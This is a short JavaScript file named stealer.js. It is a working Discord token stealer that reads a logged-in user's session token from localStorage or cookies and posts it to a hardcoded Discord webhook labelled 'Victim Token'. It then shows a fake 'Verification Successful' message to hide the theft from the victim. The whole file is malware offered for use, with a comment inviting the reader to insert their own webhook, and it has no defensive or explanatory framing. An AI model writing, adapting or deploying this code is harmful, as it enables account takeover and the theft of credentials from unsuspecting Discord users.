// stealer.js  
(async function() {  
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1521697577081372742/FjydAvklnlZ3secSXgrSGRnIyo6-daz34_gUemF7DMpJ5Ol7DeyOH60dnoWUO1qg7ser"; // PUT YOUR WEBHOOK HERE  
  
    // Helper to get token from various storage locations  
    function getToken() {  
        if (window.localStorage.token) return window.localStorage.token;  
        if (window.localStorage.__token) return window.localStorage.__token;  
        // Attempt to find in cookies (less common for modern Discord web, but possible)  
        const match = document.cookie.match(/token=([^;]+)/);  
        if (match) return match[1];  
        return null;  
    }  
  
    const token = getToken();  
  
    if (token) {  
        const payload = {  
            content: "**🚨 DISCORD TOKEN CAPTURED 🚨**",  
            embeds: [  
                {  
                    title: "Victim Token",  
                    description: `Token: \`\`\`${token}\`\`\``,  
                    color: 15158332,  
                    footer: {  
                        text: "IP and Location data is handled by Discord Webhook automatically"  
                    }  
                }  
            ]  
        };  
  
        try {  
            await fetch(WEBHOOK_URL, {  
                method: 'POST',  
                headers: { 'Content-Type': 'application/json' },  
                body: JSON.stringify(payload)  
            });  
            document.body.innerHTML = "<h1 style='color:green;text-align:center;margin-top:20%'>Verification Successful! You may close this tab.</h1>";  
        } catch (e) {  
            console.error("Failed to send token");  
        }  
    } else {  
        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>Error: Could not locate token. Are you logged in?</h1>";  
    }  
})();  
